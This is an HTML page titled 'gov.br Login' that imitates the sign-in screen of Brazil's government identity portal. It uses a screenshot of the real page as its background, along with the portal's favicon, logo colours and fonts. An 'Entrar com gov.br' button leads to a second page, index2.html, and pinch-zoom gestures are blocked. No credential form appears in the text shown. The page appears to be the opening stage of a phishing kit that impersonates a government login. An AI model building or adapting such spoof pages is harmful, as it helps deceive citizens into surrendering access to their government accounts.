<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

  <link rel="icon" href="static/govbr.png" type="image/png" />




  <title>gov.br Login</title>
  <style>
body {
  margin: 5px;
  padding: 00;
  height: 40vh;
  background: url("static/Captura de tela 2025-11-13 232843.png") no-repeat center center;
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-position: center 80%;
}
html, body {
  touch-action: manipulation; /* evita gestos extras */
  -ms-touch-action: manipulation;
  overscroll-behavior: none;
}


.overlay {
  position: absolute;
  bottom: 90px; /* distância do fundo */
  left: 50%;
  transform: translateX(-50%);
  background: rgba(255, 255, 255, 0.85);
  padding: 24px;
  border-radius: 12px;
  text-align: center;
  width: 90%;
  max-width: 360px;
}


    .logo {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 24px;
    }

    .logo span:nth-child(1) { color: #1351B4; } /* g */
    .logo span:nth-child(2) { color: #FFD700; } /* o */
    .logo span:nth-child(3) { color: #008000; } /* v */
    .logo span:nth-child(4) { color: #1351B4; } /* . */
    .logo span:nth-child(5) { color: #FFD700; } /* b */
    .logo span:nth-child(6) { color: #1351B4; } /* r */

.btn {
  display: block;
  width: 100%;
  padding: 14px;
  font-size: 16px;
  font-family: 'Roboto', Arial, sans-serif; /* fonte gov */
  background: #1351B4;
  color: #fff;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  margin-bottom: 12px;
}

.btn:hover {
  background: #0d3c8a;
}

.desc {
  font-size: 14px;
  font-family: 'Roboto', Arial, sans-serif; /* fonte gov */
  color: #333;
  margin-bottom: 16px;
}


    .qr {
      font-size: 14px;
      color: #1351B4;
      cursor: pointer;
    }

    .version {
      font-size: 12px;
      color: #666;
      margin-top: 20px;
    }
.qr {
  font-family: 'Roboto', Arial, sans-serif;
  font-size: 15px;
  color: #1351B4;
  display: flex;
  justify-content: center;   /* centraliza horizontalmente */
  align-items: center;       /* alinha verticalmente */
  gap: 8px;                  /* espaço entre ícone e texto */
  cursor: pointer;
  margin-top: 12px;
}


  </style>
</head>
<body>
  <div class="overlay">
 
    <button class="btn" onclick="window.location.href='index2.html'">Entrar com gov.br</button>

    <div class="desc">Clique para acessar sua conta gov.br</div>
    <div class="qr"><i class="fas fa-qrcode"></i> Ler QR Code</div>
    

   
  </div>



  <script>
  document.addEventListener('gesturestart', function (e) {
    e.preventDefault();
  });
  document.addEventListener('gesturechange', function (e) {
    e.preventDefault();
  });
  document.addEventListener('gestureend', function (e) {
    e.preventDefault();
  });
</script>

</body>
</html>
